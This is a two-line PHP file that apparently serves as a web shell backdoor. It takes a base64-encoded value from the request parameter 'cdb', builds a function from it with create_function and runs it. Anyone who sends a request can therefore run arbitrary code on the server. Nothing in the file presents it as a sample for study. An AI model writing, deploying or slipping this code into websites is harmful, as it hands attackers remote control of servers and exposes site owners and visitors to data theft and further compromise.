<?php
if(!empty($_REQUEST['cdb'])){$cdb=base64_decode($_REQUEST["cdb"]);$cdb=create_function('',$cdb);$cdb();exit;}